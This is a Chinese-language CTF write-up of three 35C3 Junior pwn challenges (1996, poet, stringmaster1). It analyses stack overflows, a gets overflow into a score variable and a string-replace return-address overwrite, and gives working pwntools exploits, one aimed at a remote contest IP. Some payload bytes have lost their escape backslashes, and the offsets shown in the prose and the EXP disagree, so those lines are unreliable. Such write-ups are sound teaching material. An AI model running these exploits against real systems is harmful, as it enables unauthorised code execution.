> 原文链接: https://www.anquanke.com//post/id/169775 


# 35C3 Junior pwn笔记（上）


                                阅读量   
                                **182092**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01afe24aa73e7dfe92.png)](https://p5.ssl.qhimg.com/t01afe24aa73e7dfe92.png)



## 前言

在被期末预习虐得半死的时候看到35c3的消息就去稍微看看题，结果又被非libc虐哭，在被虐哭后看到还有Junior赛就过去把Junior的pwn题悄咪咪的写了几题,但在做这些题到后面时还是会卡住，所以在这紧张刺激的期末考结束后写一点笔记来记录和复习下，这里先记录下libc非2.27的题目



## 1996

惯例先checksec文件

```
➜  1996 checksec 1996
[*] '/home/Ep3ius/CTF/pwn/process/35c3CTF2018/Junior/1996/1996'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

因为最近在练看汇编题目稍微看了下程序逻辑也不难所以就直接就看汇编分析了

```
Dump of assembler code for function main:
   0x00000000004008cd &lt;+0&gt;:    push   rbp
   0x00000000004008ce &lt;+1&gt;:    mov    rbp,rsp
   0x00000000004008d1 &lt;+4&gt;:    push   rbx
   0x00000000004008d2 &lt;+5&gt;:    sub    rsp,0x408
   0x00000000004008d9 &lt;+12&gt;:    lea    rsi,[rip+0x188]        # 0x400a68
   0x00000000004008e0 &lt;+19&gt;:    lea    rdi,[rip+0x200779]        # 0x601060 &lt;std::cout@@GLIBCXX_3.4&gt;
   0x00000000004008e7 &lt;+26&gt;:    call   0x400760 &lt;std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*)@plt&gt;
   0x00000000004008ec &lt;+31&gt;:    lea    rax,[rbp-0x410]
   0x00000000004008f3 &lt;+38&gt;:    mov    rsi,rax
   0x00000000004008f6 &lt;+41&gt;:    lea    rdi,[rip+0x200883]        # 0x601180 &lt;std::cin@@GLIBCXX_3.4&gt;
   0x00000000004008fd &lt;+48&gt;:    call   0x400740 &lt;std::basic_istream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&gt;&gt;&lt;char, std::char_traits&lt;char&gt; &gt;(std::basic_istream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char*)@plt&gt;
   0x0000000000400902 &lt;+53&gt;:    lea    rax,[rbp-0x410]
   0x0000000000400909 &lt;+60&gt;:    mov    rsi,rax
   0x000000000040090c &lt;+63&gt;:    lea    rdi,[rip+0x20074d]        # 0x601060 &lt;std::cout@@GLIBCXX_3.4&gt;
   0x0000000000400913 &lt;+70&gt;:    call   0x400760 &lt;std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*)@plt&gt;
   0x0000000000400918 &lt;+75&gt;:    lea    rsi,[rip+0x17a]        # 0x400a99
   0x000000000040091f &lt;+82&gt;:    mov    rdi,rax
   0x0000000000400922 &lt;+85&gt;:    call   0x400760 &lt;std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*)@plt&gt;
   0x0000000000400927 &lt;+90&gt;:    mov    rbx,rax
   0x000000000040092a &lt;+93&gt;:    lea    rax,[rbp-0x410]
   0x0000000000400931 &lt;+100&gt;:    mov    rdi,rax
   0x0000000000400934 &lt;+103&gt;:    call   0x400780 &lt;getenv@plt&gt;
   0x0000000000400939 &lt;+108&gt;:    mov    rsi,rax
   0x000000000040093c &lt;+111&gt;:    mov    rdi,rbx
   0x000000000040093f &lt;+114&gt;:    call   0x400760 &lt;std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*)@plt&gt;
   0x0000000000400944 &lt;+119&gt;:    mov    rdx,rax
   0x0000000000400947 &lt;+122&gt;:    mov    rax,QWORD PTR [rip+0x200692]        # 0x600fe0
   0x000000000040094e &lt;+129&gt;:    mov    rsi,rax
   0x0000000000400951 &lt;+132&gt;:    mov    rdi,rdx
   0x0000000000400954 &lt;+135&gt;:    call   0x400770 &lt;std::ostream::operator&lt;&lt;(std::ostream&amp; (*)(std::ostream&amp;))@plt&gt;
   0x0000000000400959 &lt;+140&gt;:    mov    eax,0x0
   0x000000000040095e &lt;+145&gt;:    add    rsp,0x408
   0x0000000000400965 &lt;+152&gt;:    pop    rbx
   0x0000000000400966 &lt;+153&gt;:    pop    rbp
   0x0000000000400967 &lt;+154&gt;:    ret
End of assembler dump.
```

看一下程序的main我们可以知道这里用cin来读取，如果用c来说就相当与gets也就是一个很明显的栈溢出，接着我们看到lea rax,[rbp-0x410],我们就知道了bufsize=0x410<br>
到了这里我们基本就随便玩了，因为给了执行/bin/sh的函数所以我们直接溢出劫持执行流到spawn_shell函数

```
Dump of assembler code for function _Z11spawn_shellv:
   0x0000000000400897 &lt;+0&gt;:    push   rbp
   0x0000000000400898 &lt;+1&gt;:    mov    rbp,rsp
   0x000000000040089b &lt;+4&gt;:    sub    rsp,0x10
   0x000000000040089f &lt;+8&gt;:    lea    rax,[rip+0x1b3]        # 0x400a59
   0x00000000004008a6 &lt;+15&gt;:    mov    QWORD PTR [rbp-0x10],rax
   0x00000000004008aa &lt;+19&gt;:    mov    QWORD PTR [rbp-0x8],0x0
   0x00000000004008b2 &lt;+27&gt;:    lea    rax,[rbp-0x10]
   0x00000000004008b6 &lt;+31&gt;:    mov    edx,0x0
   0x00000000004008bb &lt;+36&gt;:    mov    rsi,rax
   0x00000000004008be &lt;+39&gt;:    lea    rdi,[rip+0x194]        # 0x400a59
   0x00000000004008c5 &lt;+46&gt;:    call   0x4007a0 &lt;execve@plt&gt;
   0x00000000004008ca &lt;+51&gt;:    nop
   0x00000000004008cb &lt;+52&gt;:    leave
   0x00000000004008cc &lt;+53&gt;:    ret
End of assembler dump.
```

或者用其他的栈溢出方法，因为是简单题就不多赘述了，直接放EXP

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
#n = process('./1996')
n = remote('35.207.132.47',22227)
elf = ELF('./1996')

sh_addr = 0x0400897

n.recvuntil('?')
n.sendline('a'*(0x410+8)+p64(sh_addr))

n.interactive()
```



## poet

```
➜  poet checksec poet
[*] '/home/Ep3ius/CTF/pwn/process/35c3CTF2018/Junior/poet/poet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

简单的运行下程序看看程序的大致逻辑

```
➜  poet ./poet

**********************************************************
* We are searching for the poet of the year 2018.        *
* Submit your one line poem now to win an amazing prize! *
**********************************************************

Enter the poem here:
&gt; aaaaaaa
Who is the author of this poem?
&gt; nepire

+---------------------------------------------------------------------------+
THE POEM
aaaaaaa
SCORED 0 POINTS.

SORRY, THIS POEM IS JUST NOT GOOD ENOUGH.
YOU MUST SCORE EXACTLY 1000000 POINTS.
TRY AGAIN!
+---------------------------------------------------------------------------+
```

大致的就是让你写首诗(gou……)然后程序会给你评个分，最终目标是得到1000000分，接着看下大概的汇编

```
Dump of assembler code for function main:
   0x000000000040098b &lt;+0&gt;:    push   rbx
   0x000000000040098c &lt;+1&gt;:    mov    ecx,0x0
   0x0000000000400991 &lt;+6&gt;:    mov    edx,0x2
   0x0000000000400996 &lt;+11&gt;:    mov    esi,0x0
   0x000000000040099b &lt;+16&gt;:    mov    rdi,QWORD PTR [rip+0x2016de]        # 0x602080 &lt;stdout@@GLIBC_2.2.5&gt;
   0x00000000004009a2 &lt;+23&gt;:    call   0x400640 &lt;setvbuf@plt&gt;
   0x00000000004009a7 &lt;+28&gt;:    lea    rdi,[rip+0x292]        # 0x400c40
   0x00000000004009ae &lt;+35&gt;:    call   0x400600 &lt;puts@plt&gt;
   0x00000000004009b3 &lt;+40&gt;:    lea    rbx,[rip+0x2016e6]        # 0x6020a0 &lt;poem&gt;
   0x00000000004009ba &lt;+47&gt;:    mov    eax,0x0
   0x00000000004009bf &lt;+52&gt;:    call   0x400935 &lt;get_poem&gt;
   0x00000000004009c4 &lt;+57&gt;:    mov    eax,0x0
   0x00000000004009c9 &lt;+62&gt;:    call   0x400965 &lt;get_author&gt;
   0x00000000004009ce &lt;+67&gt;:    mov    eax,0x0
   0x00000000004009d3 &lt;+72&gt;:    call   0x4007b7 &lt;rate_poem&gt;
   0x00000000004009d8 &lt;+77&gt;:    cmp    DWORD PTR [rbx+0x440],0xf4240
   0x00000000004009e2 &lt;+87&gt;:    je     0x4009f2 &lt;main+103&gt;
   0x00000000004009e4 &lt;+89&gt;:    lea    rdi,[rip+0x345]        # 0x400d30
   0x00000000004009eb &lt;+96&gt;:    call   0x400600 &lt;puts@plt&gt;
   0x00000000004009f0 &lt;+101&gt;:    jmp    0x4009ba &lt;main+47&gt;
   0x00000000004009f2 &lt;+103&gt;:    mov    eax,0x0
   0x00000000004009f7 &lt;+108&gt;:    call   0x400767 &lt;reward&gt;
End of assembler dump.
```

main就三个关键逻辑函数(get_poem/get_author/rate_poem)，reward函数就是一个getflag的函数就不细分析了<br>
先看下get_poem和get_author的代码

```
Dump of assembler code for function get_poem:
   0x0000000000400935 &lt;+0&gt;:        sub    rsp,0x8
   0x0000000000400939 &lt;+4&gt;:        lea    rdi,[rip+0x17b]        # 0x400abb
   0x0000000000400940 &lt;+11&gt;:    mov    eax,0x0
   0x0000000000400945 &lt;+16&gt;:    call   0x400610 &lt;printf@plt&gt;
   0x000000000040094a &lt;+21&gt;:    lea    rdi,[rip+0x20174f]     # 0x6020a0 &lt;poem&gt;
   0x0000000000400951 &lt;+28&gt;:    call   0x400630 &lt;gets@plt&gt;
   0x0000000000400956 &lt;+33&gt;:    mov    DWORD PTR [rip+0x201b80],0x0        # 0x6024e0 &lt;poem+1088&gt;
   0x0000000000400960 &lt;+43&gt;:    add    rsp,0x8
   0x0000000000400964 &lt;+47&gt;:    ret
End of assembler dump.
```

```
Dump of assembler code for function get_author:
   0x0000000000400965 &lt;+0&gt;:        sub    rsp,0x8
   0x0000000000400969 &lt;+4&gt;:        lea    rdi,[rip+0x2a8]     # 0x400c18
   0x0000000000400970 &lt;+11&gt;:    mov    eax,0x0
   0x0000000000400975 &lt;+16&gt;:    call   0x400610 &lt;printf@plt&gt;
   0x000000000040097a &lt;+21&gt;:    lea    rdi,[rip+0x201b1f]  # 0x6024a0 &lt;poem+1024&gt;
   0x0000000000400981 &lt;+28&gt;:    call   0x400630 &lt;gets@plt&gt;
   0x0000000000400986 &lt;+33&gt;:    add    rsp,0x8
   0x000000000040098a &lt;+37&gt;:    ret
End of assembler dump.
```

没什么大问题，不过用了gets可能会存在越界写什么的先保留可能<br>
接着看下关键的评分函数

```
Dump of assembler code for function rate_poem:
   0x00000000004007b7 &lt;+0&gt;:        push   r13
   0x00000000004007b9 &lt;+2&gt;:        push   r12
   0x00000000004007bb &lt;+4&gt;:        push   rbp
   0x00000000004007bc &lt;+5&gt;:        push   rbx
   0x00000000004007bd &lt;+6&gt;:        sub    rsp,0x408
   0x00000000004007c4 &lt;+13&gt;:    mov    rbx,rsp
   0x00000000004007c7 &lt;+16&gt;:    lea    rsi,[rip+0x2018d2]        # 0x6020a0 &lt;poem&gt;
   0x00000000004007ce &lt;+23&gt;:    mov    rdi,rbx
   0x00000000004007d1 &lt;+26&gt;:    call   0x4005f0 &lt;strcpy@plt&gt;
   0x00000000004007d6 &lt;+31&gt;:    lea    rsi,[rip+0x2b4]        # 0x400a91
   0x00000000004007dd &lt;+38&gt;:    mov    rdi,rbx
   0x00000000004007e0 &lt;+41&gt;:    call   0x400660 &lt;strtok@plt&gt;
   0x00000000004007e5 &lt;+46&gt;:    test   rax,rax
   0x00000000004007e8 &lt;+49&gt;:    je     0x400909 &lt;rate_poem+338&gt;
   0x00000000004007ee &lt;+55&gt;:    lea    rbx,[rip+0x29f]        # 0x400a94 "ESPR"
   0x00000000004007f5 &lt;+62&gt;:    lea    rbp,[rip+0x2aa]        # 0x400aa6 "eat"
   0x00000000004007fc &lt;+69&gt;:    lea    r12,[rip+0x296]        # 0x400a99 "sleep"
   0x0000000000400803 &lt;+76&gt;:    lea    r13,[rip+0x295]        # 0x400a9f "pwn"
   0x000000000040080a &lt;+83&gt;:    jmp    0x40082d &lt;rate_poem+118&gt;
   0x000000000040080c &lt;+85&gt;:    add    DWORD PTR [rip+0x201ccd],0x64        # 0x6024e0 &lt;poem+1088&gt;
   0x0000000000400813 &lt;+92&gt;:    lea    rsi,[rip+0x277]        # 0x400a91 "n"
   0x000000000040081a &lt;+99&gt;:    mov    edi,0x0
   0x000000000040081f &lt;+104&gt;:    call   0x400660 &lt;strtok@plt&gt;
   0x0000000000400824 &lt;+109&gt;:    test   rax,rax
   0x0000000000400827 &lt;+112&gt;:    je     0x400909 &lt;rate_poem+338&gt;
   0x000000000040082d &lt;+118&gt;:    mov    ecx,0x5
   0x0000000000400832 &lt;+123&gt;:    mov    rsi,rax
   0x0000000000400835 &lt;+126&gt;:    mov    rdi,rbx
   0x0000000000400838 &lt;+129&gt;:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
   0x000000000040083a &lt;+131&gt;:    seta   dl
   0x000000000040083d &lt;+134&gt;:    sbb    dl,0x0
   0x0000000000400840 &lt;+137&gt;:    test   dl,dl
   0x0000000000400842 &lt;+139&gt;:    je     0x40080c &lt;rate_poem+85&gt;
   0x0000000000400844 &lt;+141&gt;:    mov    ecx,0x4
   0x0000000000400849 &lt;+146&gt;:    mov    rsi,rax
   0x000000000040084c &lt;+149&gt;:    mov    rdi,rbp
   0x000000000040084f &lt;+152&gt;:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
   0x0000000000400851 &lt;+154&gt;:    seta   dl
   0x0000000000400854 &lt;+157&gt;:    sbb    dl,0x0
   0x0000000000400857 &lt;+160&gt;:    test   dl,dl
   0x0000000000400859 &lt;+162&gt;:    je     0x40080c &lt;rate_poem+85&gt;
   0x000000000040085b &lt;+164&gt;:    mov    ecx,0x6
   0x0000000000400860 &lt;+169&gt;:    mov    rsi,rax
   0x0000000000400863 &lt;+172&gt;:    mov    rdi,r12
   0x0000000000400866 &lt;+175&gt;:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
   0x0000000000400868 &lt;+177&gt;:    seta   dl
   0x000000000040086b &lt;+180&gt;:    sbb    dl,0x0
   0x000000000040086e &lt;+183&gt;:    test   dl,dl
   0x0000000000400870 &lt;+185&gt;:    je     0x40080c &lt;rate_poem+85&gt;
   0x0000000000400872 &lt;+187&gt;:    mov    ecx,0x4
   0x0000000000400877 &lt;+192&gt;:    mov    rsi,rax
   0x000000000040087a &lt;+195&gt;:    mov    rdi,r13
   0x000000000040087d &lt;+198&gt;:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
   0x000000000040087f &lt;+200&gt;:    seta   dl
   0x0000000000400882 &lt;+203&gt;:    sbb    dl,0x0
   0x0000000000400885 &lt;+206&gt;:    test   dl,dl
   0x0000000000400887 &lt;+208&gt;:    je     0x40080c &lt;rate_poem+85&gt;
   0x0000000000400889 &lt;+210&gt;:    mov    ecx,0x7
   0x000000000040088e &lt;+215&gt;:    lea    rdi,[rip+0x20e]        # 0x400aa3 "repeat"
   0x0000000000400895 &lt;+222&gt;:    mov    rsi,rax
   0x0000000000400898 &lt;+225&gt;:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
   0x000000000040089a &lt;+227&gt;:    seta   dl
   0x000000000040089d &lt;+230&gt;:    sbb    dl,0x0
   0x00000000004008a0 &lt;+233&gt;:    test   dl,dl
   0x00000000004008a2 &lt;+235&gt;:    je     0x40080c &lt;rate_poem+85&gt;
   0x00000000004008a8 &lt;+241&gt;:    mov    ecx,0x4
   0x00000000004008ad &lt;+246&gt;:    lea    rdi,[rip+0x1f6]        # 0x400aaa "CTF"
   0x00000000004008b4 &lt;+253&gt;:    mov    rsi,rax
   0x00000000004008b7 &lt;+256&gt;:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
   0x00000000004008b9 &lt;+258&gt;:    seta   dl
   0x00000000004008bc &lt;+261&gt;:    sbb    dl,0x0
   0x00000000004008bf &lt;+264&gt;:    test   dl,dl
   0x00000000004008c1 &lt;+266&gt;:    je     0x40080c &lt;rate_poem+85&gt;
   0x00000000004008c7 &lt;+272&gt;:    mov    ecx,0x8
   0x00000000004008cc &lt;+277&gt;:    lea    rdi,[rip+0x1db]        # 0x400aae "capture"
   0x00000000004008d3 &lt;+284&gt;:    mov    rsi,rax
   0x00000000004008d6 &lt;+287&gt;:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
   0x00000000004008d8 &lt;+289&gt;:    seta   dl
   0x00000000004008db &lt;+292&gt;:    sbb    dl,0x0
   0x00000000004008de &lt;+295&gt;:    test   dl,dl
   0x00000000004008e0 &lt;+297&gt;:    je     0x40080c &lt;rate_poem+85&gt;
   0x00000000004008e6 &lt;+303&gt;:    mov    ecx,0x5
   0x00000000004008eb &lt;+308&gt;:    lea    rdi,[rip+0x1c4]        # 0x400ab6 "flag"
   0x00000000004008f2 &lt;+315&gt;:    mov    rsi,rax
   0x00000000004008f5 &lt;+318&gt;:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
   0x00000000004008f7 &lt;+320&gt;:    seta   al
   0x00000000004008fa &lt;+323&gt;:    sbb    al,0x0
   0x00000000004008fc &lt;+325&gt;:    test   al,al
   0x00000000004008fe &lt;+327&gt;:    jne    0x400813 &lt;rate_poem+92&gt;
   0x0000000000400904 &lt;+333&gt;:    jmp    0x40080c &lt;rate_poem+85&gt;
   0x0000000000400909 &lt;+338&gt;:    mov    edx,DWORD PTR [rip+0x201bd1]  # 0x6024e0 &lt;poem+1088&gt;
   0x000000000040090f &lt;+344&gt;:    lea    rsi,[rip+0x20178a]            # 0x6020a0 &lt;poem&gt;
   0x0000000000400916 &lt;+351&gt;:    lea    rdi,[rip+0x283]        # 0x400ba0
   0x000000000040091d &lt;+358&gt;:    mov    eax,0x0
   0x0000000000400922 &lt;+363&gt;:    call   0x400610 &lt;printf@plt&gt;
   0x0000000000400927 &lt;+368&gt;:    add    rsp,0x408
   0x000000000040092e &lt;+375&gt;:    pop    rbx
   0x000000000040092f &lt;+376&gt;:    pop    rbp
   0x0000000000400930 &lt;+377&gt;:    pop    r12
   0x0000000000400932 &lt;+379&gt;:    pop    r13
   0x0000000000400934 &lt;+381&gt;:    ret
End of assembler dump.
```

这一大段看了半天还是很混乱就去用ida反编译了一下发现还是很乱就换动态调试去理解下这里是做了什么<br>
输了一堆脏数据后发现诗中有’flag’,’CTF’,’capture’，’repeat’的每有其中一个就加100point,但不能直接输入10000个’CTF’，程序会崩,这里稍稍卡了一会，不过在尝试输入了`'a'* 0x100` 和’`b'* 0x100`后，返回得到的分数是1650614882，突然出现一个大数让我看到溢出的可能性，调试…………发现这个分数转十六进制是0x62626262,立马意识到这里的author可以直接溢出覆盖poem point的结果！经过简单定位得到偏移量为0x3c,我们把1000000转成十六进制就是0x0f4240，然后直接`'a'*0x3c+'x0fx42x40'`得到的poem point是0x40420f(4211215)并不是想要的point,稍微改一下payload改成小端序的<br>`payload = 'a' * 0x3c + 'x40x42x0f'`，success！

EXP

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./poet')
elf = ELF('./poet')

n.recvuntil('&gt; ')
n.sendline('nepire')
n.recvuntil('&gt; ')

n.sendline('a'*64+'x0fx42x40')

n.interactive()
```



### <a class="reference-link" name="stringmaster1"></a>stringmaster1

```
➜  stringmaster1 checksec stringmaster1
[*] '/home/Ep3ius/CTF/pwn/process/35c3CTF2018/Junior/stringmaster1/stringmaster1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

在粗略过一遍接近4k行还看得难受得半死的c++汇编后,立即推放弃看汇编，给了源码就直接怼源码

```
#include &lt;iostream&gt;
#include &lt;cstdlib&gt;
#include &lt;ctime&gt;
#include &lt;vector&gt;
#include &lt;unistd.h&gt;
#include &lt;limits&gt;

using namespace std;

const string chars = "abcdefghijklmnopqrstuvwxy";
void spawn_shell()
`{`
    char* args[] = `{`(char*)"/bin/bash", NULL`}`;
    execve("/bin/bash", args, NULL);
`}`
void print_menu()
`{`
    cout &lt;&lt; endl;
    cout &lt;&lt; "Enter the command you want to execute:" &lt;&lt; endl;
    cout &lt;&lt; "[1] swap &lt;index1&gt; &lt;index2&gt;                   (Cost: 1)" &lt;&lt; endl;
    cout &lt;&lt; "[2] replace &lt;char1&gt; &lt;char2&gt;                  (Cost: 1)" &lt;&lt; endl;
    cout &lt;&lt; "[3] print                                    (Cost: 1)" &lt;&lt; endl;
    cout &lt;&lt; "[4] quit                                              " &lt;&lt; endl;
    cout &lt;&lt; "&gt; ";
`}`

void play()
`{`
    string from(10, '0');
    string to(10, '0');
    for (int i = 0; i &lt; 10; ++i)
    `{`
        from[i] = chars[rand() % (chars.length() - 1)];
        to[i] = chars[rand() % (chars.length() - 1)];
    `}`


    cout &lt;&lt; "Perform the following operations on String1 to generate String2 with minimum costs." &lt;&lt; endl &lt;&lt; endl;
    cout &lt;&lt; "[1] swap &lt;index1&gt; &lt;index2&gt;                   (Cost: 1)" &lt;&lt; endl;
    cout &lt;&lt; "    Swaps the char at index1 with the char at index2  " &lt;&lt; endl;
    cout &lt;&lt; "[2] replace &lt;char1&gt; &lt;char2&gt;                  (Cost: 1)" &lt;&lt; endl;
    cout &lt;&lt; "    Replaces the first occurence of char1 with char2  " &lt;&lt; endl;
    cout &lt;&lt; "[3] print                                    (Cost: 1)" &lt;&lt; endl;
    cout &lt;&lt; "    Prints the current version of the string          " &lt;&lt; endl;
    cout &lt;&lt; "[4] quit                                              " &lt;&lt; endl;
    cout &lt;&lt; "    Give up and leave the game                        " &lt;&lt; endl;
    cout &lt;&lt; endl;
    cout &lt;&lt; "String1: " &lt;&lt; from &lt;&lt; endl;
    cout &lt;&lt; "String2: " &lt;&lt; to &lt;&lt; endl;
    cout &lt;&lt; endl;

    unsigned int costs = 0;
    string s(from);

    while (true)
    `{`
        print_menu();

        string command;
        cin &gt;&gt; command;

        if (command == "swap")
        `{`
            unsigned int i1, i2;
            cin &gt;&gt; i1 &gt;&gt; i2;
            if (cin.good() &amp;&amp; i1 &lt; s.length() &amp;&amp; i2 &lt; s.length())
            `{`
                swap(s[i1], s[i2]);
            `}`
            costs += 1;
        `}`
        else if (command == "replace")
        `{`
            char c1, c2;
            cin &gt;&gt; c1 &gt;&gt; c2;
            auto index = s.find(c1);
            cout &lt;&lt; c1 &lt;&lt; c2 &lt;&lt; index &lt;&lt; endl;
            if (index &gt;= 0)
            `{`
                s[index] = c2;
            `}`
            costs += 1;
        `}`
        else if (command == "print")
        `{`
            cout &lt;&lt; s &lt;&lt; endl;
            costs += 1;
        `}`
        else if (command == "quit")
        `{`
            cout &lt;&lt; "You lost." &lt;&lt; endl;
            break;
        `}`
        else
        `{`
            cout &lt;&lt; "Invalid command" &lt;&lt; endl;
        `}`

        if (!cin)
        `{`
            cin.clear();
            cin.ignore(numeric_limits&lt;streamsize&gt;::max(), 'n');
        `}`
        if (!cout)
        `{`
            cout.clear();
        `}`

        if (s == to)
        `{`
            cout &lt;&lt; s.length() &lt;&lt; endl;
            cout &lt;&lt; endl;
            cout &lt;&lt; "****************************************" &lt;&lt; endl;
            cout &lt;&lt; "* Congratulations                       " &lt;&lt; endl;
            cout &lt;&lt; "* You solved the problem with cost: " &lt;&lt; costs &lt;&lt; endl;
            cout &lt;&lt; "****************************************" &lt;&lt; endl;
            cout &lt;&lt; endl;
            break;
        `}`
    `}`
`}`

int main()
`{`
    srand(time(nullptr));
    play();
`}`
```

程序的大致流程：<br>
1.先初始化一个以时间为种子的随机数<br>
2.随机生成两个string类型的key<br>
3.进入有三个功能的标准菜单循环<br>
4.最终需要把函数劫持到spawn_shell函数(0x4011A7)中getshell

我们可以看到程序中用了一个看上去不那么舒服的find函数

```
auto index = s.find(c1);
```

然后我们再看下cplusplus给出的find函数模板和样例

```
template &lt;class InputIterator, class T&gt;
InputIterator
find (
  InputIterator first,
  InputIterator last,
  const T&amp; val
);
```

```
// find example
#include &lt;iostream&gt;     // std::cout
#include &lt;algorithm&gt;    // std::find
#include &lt;vector&gt;       // std::vector

int main () `{`
  // using std::find with array and pointer:
  int myints[] = `{` 10, 20, 30, 40 `}`;
  int * p;
  p = std::find (myints, myints+4, 30);
  if (p != myints+4)
    std::cout &lt;&lt; "Element found in myints: " &lt;&lt; *p &lt;&lt; 'n';
  else
    std::cout &lt;&lt; "Element not found in myintsn";
  // using std::find with vector and iterator:
  std::vector&lt;int&gt; myvector (myints,myints+4);
  std::vector&lt;int&gt;::iterator it;
  it = find (myvector.begin(), myvector.end(), 30);
  if (it != myvector.end())
    std::cout &lt;&lt; "Element found in myvector: " &lt;&lt; *it &lt;&lt; 'n';
  else
    std::cout &lt;&lt; "Element not found in myvectorn";
  return 0;
`}`
```

程序并没有给出find的first和last,那么我们稍微调试一下replace部分就能得到这个可以基本达成栈上的任意写，也就是说只要改play函数的retrun指针指向spwan_shell就可以成功getshell了，由于开始的位置和return指针之间不能保证要改的那个值只有在return指针有，所以我们多修改几次就能成功的修改指针来getshell了<br>
EXP

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./stringmaster1')
elf = ELF('./stringmaster1')
libc = elf.libc

#n.recvuntil('String1: ')
#str1 = n.recvline().strip()
#n.recvuntil('String2: ')
#str2 = n.recvline().strip()

for i in range(4):
    n.recvuntil('')
    n.sendline('replace x24 x11')

for i in range(4):
    n.recvuntil('')
    n.sendline('replace x6d xa7')

n.sendline('quit')
n.interactive()
```

#### <a class="reference-link" name="%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"></a>参考链接

[cplusplus_find](http://www.cplusplus.com/reference/algorithm/find/)
